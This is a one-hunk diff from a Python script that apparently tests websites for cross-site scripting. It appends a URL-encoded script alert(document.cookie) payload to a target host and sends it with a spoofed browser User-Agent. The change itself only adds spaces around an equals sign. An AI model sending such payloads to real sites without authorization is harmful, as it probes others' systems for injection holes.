@@ -280,7 +280,7 @@ if('2' in choice):
                 opener = build_opener(HTTPCookieProcessor(cj), HTTPHandler())
                 xss_cookie = ("%3cscript%3ealert(document.cookie)%3c/script%3e")
                 url1 = (host+xss_cookie)
-                req = Request(url1, headers={'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30"})
+                req = Request(url1, headers = {'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30"})
                 f = opener.open(req)
                 html = f.read()
                 print ("Execute document.cookie")
